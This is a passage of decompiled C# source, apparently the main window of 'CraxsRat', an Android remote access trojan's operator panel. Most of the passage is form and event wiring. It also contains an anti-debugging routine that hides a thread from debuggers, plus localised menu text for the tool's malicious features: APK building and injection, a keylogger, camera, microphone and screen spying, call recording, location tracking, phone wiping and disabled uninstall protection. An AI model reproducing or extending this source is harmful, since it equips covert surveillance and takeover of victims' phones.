		set;
	}

	[field: AccessedThroughProperty("tipkey")]
	internal virtual DrakeUIAvatar tipkey
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual DrakeUITextBox porttext
	{
		[CompilerGenerated]
		get
		{
			return _porttext;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = Porttext_TextChanged;
			DrakeUITextBox drakeUITextBox = _porttext;
			if (drakeUITextBox != null)
			{
				drakeUITextBox.TextChanged -= value2;
			}
			_porttext = value;
			drakeUITextBox = _porttext;
			if (drakeUITextBox != null)
			{
				drakeUITextBox.TextChanged += value2;
			}
		}
	}

	internal virtual DrakeUIAvatar DrakeUIAvatar2
	{
		[CompilerGenerated]
		get
		{
			return _DrakeUIAvatar2;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = DrakeUIAvatar2_Click_1;
			DrakeUIAvatar drakeUIAvatar = _DrakeUIAvatar2;
			if (drakeUIAvatar != null)
			{
				drakeUIAvatar.Click -= value2;
			}
			_DrakeUIAvatar2 = value;
			drakeUIAvatar = _DrakeUIAvatar2;
			if (drakeUIAvatar != null)
			{
				drakeUIAvatar.Click += value2;
			}
		}
	}

	internal virtual DrakeUIAvatar rempo
	{
		[CompilerGenerated]
		get
		{
			return _rempo;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = Rempo_Click;
			DrakeUIAvatar drakeUIAvatar = _rempo;
			if (drakeUIAvatar != null)
			{
				drakeUIAvatar.Click -= value2;
			}
			_rempo = value;
			drakeUIAvatar = _rempo;
			if (drakeUIAvatar != null)
			{
				drakeUIAvatar.Click += value2;
			}
		}
	}

	public virtual DataGridView DGVSERVS
	{
		[CompilerGenerated]
		get
		{
			return _DGVSERVS;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			DataGridViewCellEventHandler value2 = DGVSERVS_CellClick;
			DataGridView dataGridView = _DGVSERVS;
			if (dataGridView != null)
			{
				dataGridView.CellClick -= value2;
			}
			_DGVSERVS = value;
			dataGridView = _DGVSERVS;
			if (dataGridView != null)
			{
				dataGridView.CellClick += value2;
			}
		}
	}

	[field: AccessedThroughProperty("statusico")]
	internal virtual DataGridViewImageColumn statusico
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("portnam")]
	internal virtual DataGridViewTextBoxColumn portnam
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("DataGridViewTextBoxColumn6")]
	internal virtual DataGridViewTextBoxColumn DataGridViewTextBoxColumn6
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Label3")]
	internal virtual Label Label3
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Panel15")]
	internal virtual Panel Panel15
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("ImageList1")]
	internal virtual ImageList ImageList1
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual DrakeUIAvatar DrakeUIAvatar4
	{
		[CompilerGenerated]
		get
		{
			return _DrakeUIAvatar4;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = DrakeUIAvatar4_Click_1;
			DrakeUIAvatar drakeUIAvatar = _DrakeUIAvatar4;
			if (drakeUIAvatar != null)
			{
				drakeUIAvatar.Click -= value2;
			}
			_DrakeUIAvatar4 = value;
			drakeUIAvatar = _DrakeUIAvatar4;
			if (drakeUIAvatar != null)
			{
				drakeUIAvatar.Click += value2;
			}
		}
	}

	[field: AccessedThroughProperty("MonitorPanel")]
	internal virtual Panel MonitorPanel
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("DGFW")]
	public virtual DataGridView DGFW
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("FWPANEL")]
	internal virtual Panel FWPANEL
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual DrakeUIAvatar DrakeUIAvatar9
	{
		[CompilerGenerated]
		get
		{
			return _DrakeUIAvatar9;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = DrakeUIAvatar9_Click_1;
			DrakeUIAvatar drakeUIAvatar = _DrakeUIAvatar9;
			if (drakeUIAvatar != null)
			{
				drakeUIAvatar.Click -= value2;
			}
			_DrakeUIAvatar9 = value;
			drakeUIAvatar = _DrakeUIAvatar9;
			if (drakeUIAvatar != null)
			{
				drakeUIAvatar.Click += value2;
			}
		}
	}

	internal virtual DrakeUIAvatar DrakeUIAvatar8
	{
		[CompilerGenerated]
		get
		{
			return _DrakeUIAvatar8;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = DrakeUIAvatar8_Click_1;
			DrakeUIAvatar drakeUIAvatar = _DrakeUIAvatar8;
			if (drakeUIAvatar != null)
			{
				drakeUIAvatar.Click -= value2;
			}
			_DrakeUIAvatar8 = value;
			drakeUIAvatar = _DrakeUIAvatar8;
			if (drakeUIAvatar != null)
			{
				drakeUIAvatar.Click += value2;
			}
		}
	}

	internal virtual DrakeUIAvatar DrakeUIAvatar5
	{
		[CompilerGenerated]
		get
		{
			return _DrakeUIAvatar5;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = DrakeUIAvatar5_Click_1;
			DrakeUIAvatar drakeUIAvatar = _DrakeUIAvatar5;
			if (drakeUIAvatar != null)
			{
				drakeUIAvatar.Click -= value2;
			}
			_DrakeUIAvatar5 = value;
			drakeUIAvatar = _DrakeUIAvatar5;
			if (drakeUIAvatar != null)
			{
				drakeUIAvatar.Click += value2;
			}
		}
	}

	[field: AccessedThroughProperty("FWstatus")]
	internal virtual DrakeUIAvatar FWstatus
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Panel18")]
	internal virtual Panel Panel18
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Panel19")]
	internal virtual Panel Panel19
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("FWctx")]
	internal virtual DrakeUIContextMenuStrip FWctx
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual ToolStripMenuItem AllowAppToolStripMenuItem
	{
		[CompilerGenerated]
		get
		{
			return _AllowAppToolStripMenuItem;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = AllowAppToolStripMenuItem_Click;
			ToolStripMenuItem toolStripMenuItem = _AllowAppToolStripMenuItem;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click -= value2;
			}
			_AllowAppToolStripMenuItem = value;
			toolStripMenuItem = _AllowAppToolStripMenuItem;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click += value2;
			}
		}
	}

	internal virtual ToolStripMenuItem ToolStripMenuItem15
	{
		[CompilerGenerated]
		get
		{
			return _ToolStripMenuItem15;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = ToolStripMenuItem15_Click_1;
			ToolStripMenuItem toolStripMenuItem = _ToolStripMenuItem15;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click -= value2;
			}
			_ToolStripMenuItem15 = value;
			toolStripMenuItem = _ToolStripMenuItem15;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click += value2;
			}
		}
	}

	[field: AccessedThroughProperty("Panel16")]
	internal virtual Panel Panel16
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual DrakeUIButtonIcon DrakeUIButtonIcon14
	{
		[CompilerGenerated]
		get
		{
			return _DrakeUIButtonIcon14;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = DrakeUIButtonIcon14_Click_1;
			DrakeUIButtonIcon drakeUIButtonIcon = _DrakeUIButtonIcon14;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click -= value2;
			}
			_DrakeUIButtonIcon14 = value;
			drakeUIButtonIcon = _DrakeUIButtonIcon14;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click += value2;
			}
		}
	}

	internal virtual DrakeUIButtonIcon DrakeUIButtonIcon17
	{
		[CompilerGenerated]
		get
		{
			return _DrakeUIButtonIcon17;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = DrakeUIButtonIcon17_Click;
			DrakeUIButtonIcon drakeUIButtonIcon = _DrakeUIButtonIcon17;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click -= value2;
			}
			_DrakeUIButtonIcon17 = value;
			drakeUIButtonIcon = _DrakeUIButtonIcon17;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click += value2;
			}
		}
	}

	internal virtual DrakeUIButtonIcon DrakeUIButtonIcon18
	{
		[CompilerGenerated]
		get
		{
			return _DrakeUIButtonIcon18;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = DrakeUIButtonIcon18_Click;
			DrakeUIButtonIcon drakeUIButtonIcon = _DrakeUIButtonIcon18;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click -= value2;
			}
			_DrakeUIButtonIcon18 = value;
			drakeUIButtonIcon = _DrakeUIButtonIcon18;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click += value2;
			}
		}
	}

	internal virtual DrakeUIButtonIcon DrakeUIButtonIcon19
	{
		[CompilerGenerated]
		get
		{
			return _DrakeUIButtonIcon19;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = DrakeUIButtonIcon19_Click;
			DrakeUIButtonIcon drakeUIButtonIcon = _DrakeUIButtonIcon19;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click -= value2;
			}
			_DrakeUIButtonIcon19 = value;
			drakeUIButtonIcon = _DrakeUIButtonIcon19;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click += value2;
			}
		}
	}

	[field: AccessedThroughProperty("Panel20")]
	internal virtual Panel Panel20
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Label4")]
	internal virtual Label Label4
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("TRKPANEL")]
	internal virtual Panel TRKPANEL
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Label5")]
	internal virtual Label Label5
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual DrakeUIAvatar DrakeUIAvatar11
	{
		[CompilerGenerated]
		get
		{
			return _DrakeUIAvatar11;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = DrakeUIAvatar11_Click;
			DrakeUIAvatar drakeUIAvatar = _DrakeUIAvatar11;
			if (drakeUIAvatar != null)
			{
				drakeUIAvatar.Click -= value2;
			}
			_DrakeUIAvatar11 = value;
			drakeUIAvatar = _DrakeUIAvatar11;
			if (drakeUIAvatar != null)
			{
				drakeUIAvatar.Click += value2;
			}
		}
	}

	[field: AccessedThroughProperty("DGVTRK")]
	public virtual DataGridView DGVTRK
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual DrakeUIButtonIcon DrakeUIButtonIcon16
	{
		[CompilerGenerated]
		get
		{
			return _DrakeUIButtonIcon16;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = DrakeUIButtonIcon16_Click;
			DrakeUIButtonIcon drakeUIButtonIcon = _DrakeUIButtonIcon16;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click -= value2;
			}
			_DrakeUIButtonIcon16 = value;
			drakeUIButtonIcon = _DrakeUIButtonIcon16;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click += value2;
			}
		}
	}

	[field: AccessedThroughProperty("TRKctx")]
	internal virtual DrakeUIContextMenuStrip TRKctx
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual ToolStripMenuItem ToolStripMenuItem19
	{
		[CompilerGenerated]
		get
		{
			return _ToolStripMenuItem19;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = ToolStripMenuItem19_Click;
			ToolStripMenuItem toolStripMenuItem = _ToolStripMenuItem19;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click -= value2;
			}
			_ToolStripMenuItem19 = value;
			toolStripMenuItem = _ToolStripMenuItem19;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click += value2;
			}
		}
	}

	internal virtual ToolStripMenuItem ToolStripMenuItem21
	{
		[CompilerGenerated]
		get
		{
			return _ToolStripMenuItem21;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = ToolStripMenuItem21_Click;
			ToolStripMenuItem toolStripMenuItem = _ToolStripMenuItem21;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click -= value2;
			}
			_ToolStripMenuItem21 = value;
			toolStripMenuItem = _ToolStripMenuItem21;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click += value2;
			}
		}
	}

	internal virtual ToolStripMenuItem ToolStripMenuItem22
	{
		[CompilerGenerated]
		get
		{
			return _ToolStripMenuItem22;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = ToolStripMenuItem22_Click;
			ToolStripMenuItem toolStripMenuItem = _ToolStripMenuItem22;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click -= value2;
			}
			_ToolStripMenuItem22 = value;
			toolStripMenuItem = _ToolStripMenuItem22;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click += value2;
			}
		}
	}

	internal virtual ToolStripMenuItem ToolStripMenuItem20
	{
		[CompilerGenerated]
		get
		{
			return _ToolStripMenuItem20;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = ToolStripMenuItem20_Click;
			ToolStripMenuItem toolStripMenuItem = _ToolStripMenuItem20;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click -= value2;
			}
			_ToolStripMenuItem20 = value;
			toolStripMenuItem = _ToolStripMenuItem20;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click += value2;
			}
		}
	}

	[field: AccessedThroughProperty("Panel17")]
	internal virtual Panel Panel17
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("recordsShowpanel")]
	internal virtual Panel recordsShowpanel
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("recordshowtext")]
	internal virtual TextBox recordshowtext
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual DrakeUIButtonIcon DrakeUIButtonIcon20
	{
		[CompilerGenerated]
		get
		{
			return _DrakeUIButtonIcon20;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = DrakeUIButtonIcon20_Click;
			DrakeUIButtonIcon drakeUIButtonIcon = _DrakeUIButtonIcon20;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click -= value2;
			}
			_DrakeUIButtonIcon20 = value;
			drakeUIButtonIcon = _DrakeUIButtonIcon20;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click += value2;
			}
		}
	}

	internal virtual ToolStripMenuItem ToolStripMenuItem24
	{
		[CompilerGenerated]
		get
		{
			return _ToolStripMenuItem24;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = ToolStripMenuItem24_Click;
			ToolStripMenuItem toolStripMenuItem = _ToolStripMenuItem24;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click -= value2;
			}
			_ToolStripMenuItem24 = value;
			toolStripMenuItem = _ToolStripMenuItem24;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click += value2;
			}
		}
	}

	internal virtual ToolStripMenuItem ToolStripMenuItem23
	{
		[CompilerGenerated]
		get
		{
			return _ToolStripMenuItem23;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = ToolStripMenuItem23_Click;
			ToolStripMenuItem toolStripMenuItem = _ToolStripMenuItem23;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click -= value2;
			}
			_ToolStripMenuItem23 = value;
			toolStripMenuItem = _ToolStripMenuItem23;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click += value2;
			}
		}
	}

	[field: AccessedThroughProperty("combodatestrack")]
	internal virtual DrakeUIComboBox combodatestrack
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual ToolStripMenuItem ToolStripMenuItem25
	{
		[CompilerGenerated]
		get
		{
			return _ToolStripMenuItem25;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = ToolStripMenuItem25_Click;
			ToolStripMenuItem toolStripMenuItem = _ToolStripMenuItem25;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click -= value2;
			}
			_ToolStripMenuItem25 = value;
			toolStripMenuItem = _ToolStripMenuItem25;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click += value2;
			}
		}
	}

	internal virtual DrakeUIButtonIcon droperbtn
	{
		[CompilerGenerated]
		get
		{
			return _droperbtn;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = Droperbtn_Click;
			DrakeUIButtonIcon drakeUIButtonIcon = _droperbtn;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click -= value2;
			}
			_droperbtn = value;
			drakeUIButtonIcon = _droperbtn;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click += value2;
			}
		}
	}

	[field: AccessedThroughProperty("DrakeUIAvatar7")]
	internal virtual DrakeUIAvatar DrakeUIAvatar7
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual System.Windows.Forms.Timer monitortimer
	{
		[CompilerGenerated]
		get
		{
			return _monitortimer;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = Satustimer_Tick;
			System.Windows.Forms.Timer timer = _monitortimer;
			if (timer != null)
			{
				timer.Tick -= value2;
			}
			_monitortimer = value;
			timer = _monitortimer;
			if (timer != null)
			{
				timer.Tick += value2;
			}
		}
	}

	internal virtual System.Windows.Forms.Timer Timer1
	{
		[CompilerGenerated]
		get
		{
			return _Timer1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = Timer1_Tick;
			System.Windows.Forms.Timer timer = _Timer1;
			if (timer != null)
			{
				timer.Tick -= value2;
			}
			_Timer1 = value;
			timer = _Timer1;
			if (timer != null)
			{
				timer.Tick += value2;
			}
		}
	}

	static CraxsRatMain()
	{
		ISDB = true;
		MyStatus = 1;
	}

	[DllImport("user32.dll")]
	public static extern IntPtr FindWindow(string strclassName, string strWindowName);

	[DllImport("Kernel32.dll")]
	public static extern IntPtr OutputDebugString(string Txt);

	[DllImport("Ntdll.dll")]
	public static extern int NtSetInformationThread(IntPtr hThread, int ThreadInformationClass, IntPtr ThreadInformation, int ThreadInformationLength);

	[DllImport("Kernel32.dll")]
	public static extern IntPtr GetCurrentThread();

	public static int HDB()
	{
		MyStatus = NtSetInformationThread(GetCurrentThread(), 17, default(IntPtr), 0);
		if (MyStatus != 0)
		{
			Interaction.MsgBox("Error : X00101", (MsgBoxStyle)MyStatus);
			Debugger.Break();
			return 0;
		}
		ISDB = false;
		return 1;
	}

	public void Translateme()
	{
		switch (RegistryHandler.Get_Language())
		{
		case "CN":
			infobox.Text = "信息";
			droperbtn.Text = "安装人员";
			studiobtn.Text = "工作室";
			SentBox.Text = "发了";
			ReciveBox.Text = "收到";
			RecentBox.Text = "最近";
			infotitlepanel.Text = "仪表板";
			activityzpanel.Text = "最新活动";
			notifispanel.Text = "最近的通知";
			mappanel.Text = "连接图";
			callspanel.Text = "最近通话";
			notifiaisbtntop.Text = "通知";
			Home_Btn.Text = "主页";
			Clients_Btn.Text = "客户";
			blockbtn.Text = "阻止页面";
			Connection_btn.Text = "连接页面";
			Build_btn.Text = "新应用";
			inject_btn.Text = "注入应用程序";
			About_btn.Text = "关于";
			Settings_btn.Text = "程序设置";
			porttext.Watermark = "连接端口";
			passtxt.Watermark = "连接键";
			checksavepass.Text = Codes.Translate(checksavepass.Text, "en", "zh");
			serversbtn.Text = Codes.Translate(serversbtn.Text, "en", "zh");
			ToolTips.SetToolTip(Home_Btn, "主页");
			ToolTips.SetToolTip(Clients_Btn, "客户页面");
			ToolTips.SetToolTip(blockbtn, "阻止页面");
			ToolTips.SetToolTip(Connection_btn, "连接页面");
			ToolTips.SetToolTip(Build_btn, "应用程序生成器");
			ToolTips.SetToolTip(inject_btn, "应用程序注入器");
			ToolTips.SetToolTip(About_btn, "关于");
			ToolTips.SetToolTip(Settings_btn, "程序设置");
			toblocktext.Watermark = Codes.Translate(toblocktext.Watermark, "en", "zh");
			searchtext.Watermark = "按名称、国家、地址搜索";
			break;
		case "AR":
			infobox.Text = "معلومات";
			SentBox.Text = "الأرسال";
			ReciveBox.Text = "التحميل";
			RecentBox.Text = "جديد";
			infotitlepanel.Text = "الرئيسية";
			porttext.Watermark = "منفذ الاتصال";
			passtxt.Watermark = "مفتاح الاتصال";
			notifispanel.Text = "اخر التنبيهات";
			mappanel.Text = "خريطة الاتصالات";
			callspanel.Text = "اخر المكالمات";
			checksavepass.Text = Codes.Translate(checksavepass.Text, "en", "ar");
			serversbtn.Text = Codes.Translate(serversbtn.Text, "en", "ar");
			Home_Btn.Text = "الرئيسية";
			Clients_Btn.Text = "المستخدمين";
			blockbtn.Text = "قائمة الحظر";
			Connection_btn.Text = "قائمة الاتصالات";
			Build_btn.Text = "إنشاء تطبيق";
			inject_btn.Text = "حقن تطبيق";
			About_btn.Text = "حول البرنامج";
			Settings_btn.Text = "إعدادات البرنامج";
			activityzpanel.Text = "اخر النشاطات";
			ToolTips.SetToolTip(Home_Btn, "الرئيسية");
			ToolTips.SetToolTip(Clients_Btn, "عملاء");
			ToolTips.SetToolTip(blockbtn, "قائمة الحظر");
			ToolTips.SetToolTip(Connection_btn, "قائمة الاتصالات");
			ToolTips.SetToolTip(Build_btn, "إنشاء تطبيق");
			ToolTips.SetToolTip(inject_btn, "حقن تطبيق");
			ToolTips.SetToolTip(About_btn, "حول البرنامج");
			ToolTips.SetToolTip(Settings_btn, "إعدادات البرنامج");
			toblocktext.Watermark = Codes.Translate(toblocktext.Watermark, "en", "ar");
			searchtext.Watermark = "البحث بالاسم،البلد،العنوان، ...";
			notifiaisbtntop.Text = "إشعارات";
			studiobtn.Text = "الاستوديو";
			droperbtn.Text = "المثتب";
			break;
		case "EN":
			ToolTips.SetToolTip(Home_Btn, "Home");
			ToolTips.SetToolTip(Clients_Btn, "Clients");
			ToolTips.SetToolTip(blockbtn, "Block List");
			ToolTips.SetToolTip(Connection_btn, "Connections");
			ToolTips.SetToolTip(Build_btn, "Build Apk");
			ToolTips.SetToolTip(inject_btn, "inject Apk");
			ToolTips.SetToolTip(About_btn, "About");
			ToolTips.SetToolTip(Settings_btn, "Settings");
			break;
		}
		string language = RegistryHandler.Get_Language();
		if (Operators.CompareString(language, "AR", TextCompare: false) != 0)
		{
			if (Operators.CompareString(language, "CN", TextCompare: false) == 0)
			{
				FWctx.Items[0].Text = "允许";
				FWctx.Items[1].Text = "禁止";
				FWctx.Items[2].Text = "添加到轨道";
				TRKctx.Items[0].Text = "添加应用程序";
				TRKctx.Items[1].Text = "截图";
				TRKctx.Items[2].Text = "记录";
				TRKctx.Items[3].Text = "删除截图";
				TRKctx.Items[4].Text = "删除记录";
				TRKctx.Items[5].Text = "停止追踪";
				ctxmenu.Items[0].Text = "管理";
				ToolStripMenuItem toolStripMenuItem = (ToolStripMenuItem)ctxmenu.Items[0];
				toolStripMenuItem.DropDownItems[0].Text = "文件   ";
				toolStripMenuItem.DropDownItems[1].Text = "短信";
				toolStripMenuItem.DropDownItems[2].Text = "来电";
				toolStripMenuItem.DropDownItems[3].Text = "往来";
				toolStripMenuItem.DropDownItems[4].Text = "帐户";
				toolStripMenuItem.DropDownItems[5].Text = "应用";
				toolStripMenuItem.DropDownItems[6].Text = "权限";
				ctxmenu.Items[2].Text = "监控";
				ToolStripMenuItem toolStripMenuItem2 = (ToolStripMenuItem)ctxmenu.Items[2];
				toolStripMenuItem2.DropDownItems[0].Text = "手机屏幕";
				toolStripMenuItem2.DropDownItems[1].Text = "屏幕阅读器 2";
				toolStripMenuItem2.DropDownItems[2].Text = "相机";
				toolStripMenuItem2.DropDownItems[3].Text = "麦克风";
				toolStripMenuItem2.DropDownItems[4].Text = "键盘记录器";
				toolStripMenuItem2.DropDownItems[5].Text = "地点";
				toolStripMenuItem2.DropDownItems[6].Text = "浏览器";
				toolStripMenuItem2.DropDownItems[7].Text = "通话记录器";
				toolStripMenuItem2.DropDownItems[8].Text = "自动答题器";
				toolStripMenuItem2.DropDownItems[9].Text = "屏幕阅读器";
				ctxmenu.Items[4].Text = "行政";
				ToolStripMenuItem toolStripMenuItem3 = (ToolStripMenuItem)ctxmenu.Items[4];
				toolStripMenuItem3.DropDownItems[0].Text = "请求管理员权限";
				toolStripMenuItem3.DropDownItems[1].Text = "锁屏";
				toolStripMenuItem3.DropDownItems[2].Text = "擦除手机数据";
				ctxmenu.Items[6].Text = "工具";
				ToolStripMenuItem toolStripMenuItem4 = (ToolStripMenuItem)ctxmenu.Items[6];
				toolStripMenuItem4.DropDownItems[0].Text = "电话号码";
				toolStripMenuItem4.DropDownItems[1].Text = "安装软件";
				toolStripMenuItem4.DropDownItems[2].Text = "发送通知";
				toolStripMenuItem4.DropDownItems[3].Text = "剪贴板";
				toolStripMenuItem4.DropDownItems[4].Text = "打开链接";
				toolStripMenuItem4.DropDownItems[5].Text = "终端";
				ctxmenu.Items[8].Text = "额外的";
				ToolStripMenuItem toolStripMenuItem5 = (ToolStripMenuItem)ctxmenu.Items[8];
				toolStripMenuItem5.DropDownItems[0].Text = "通知";
				toolStripMenuItem5.DropDownItems[1].Text = "通话活动";
				toolStripMenuItem5.DropDownItems[2].Text = "电话信息";
				ctxmenu.Items[10].Text = "联系";
				ToolStripMenuItem toolStripMenuItem6 = (ToolStripMenuItem)ctxmenu.Items[10];
				toolStripMenuItem6.DropDownItems[0].Text = "重新连接";
				toolStripMenuItem6.DropDownItems[1].Text = "堵塞";
				toolStripMenuItem6.DropDownItems[2].Text = "禁用反删除";
				toolStripMenuItem6.DropDownItems[3].Text = "自行删除";
				ctxmenu.Items[12].Text = "键盘 (beta)";
				ctxmenu.Items[14].Text = "客户文件夹";
			}
		}
		else
		{
			ctxmenu.Items[0].Text = "إدارة";
			ToolStripMenuItem toolStripMenuItem7 = (ToolStripMenuItem)ctxmenu.Items[0];
			toolStripMenuItem7.DropDownItems[0].Text = "الملفات";
			toolStripMenuItem7.DropDownItems[1].Text = "الرسائل";
			toolStripMenuItem7.DropDownItems[2].Text = "المكالمات";
			toolStripMenuItem7.DropDownItems[3].Text = "الأسماء";
			toolStripMenuItem7.DropDownItems[4].Text = "الحسابات";
			toolStripMenuItem7.DropDownItems[5].Text = "التطبيقات";
			toolStripMenuItem7.DropDownItems[6].Text = "الصلاحيات";
			ctxmenu.Items[2].Text = "مراقبة";
			ToolStripMenuItem toolStripMenuItem8 = (ToolStripMenuItem)ctxmenu.Items[2];
			toolStripMenuItem8.DropDownItems[0].Text = "شاشة الهاتف";
			toolStripMenuItem8.DropDownItems[1].Text = "قراءة الشاشة 2";
			toolStripMenuItem8.DropDownItems[2].Text = "الكاميرا";
			toolStripMenuItem8.DropDownItems[3].Text = "الميكروفون";
			toolStripMenuItem8.DropDownItems[4].Text = "مسجل المفاتيح";
			toolStripMenuItem8.DropDownItems[5].Text = "الموقع";
			toolStripMenuItem8.DropDownItems[6].Text = "المتصفح";
			toolStripMenuItem8.DropDownItems[7].Text = "مسجل المكالمات";
			toolStripMenuItem8.DropDownItems[8].Text = "شاشة المس";
			toolStripMenuItem8.DropDownItems[9].Text = "قراءة الشاشة";
			ctxmenu.Items[4].Text = "مسؤول";
			ToolStripMenuItem toolStripMenuItem9 = (ToolStripMenuItem)ctxmenu.Items[4];
			toolStripMenuItem9.DropDownItems[0].Text = "تفعيل مسؤول الجهاز";
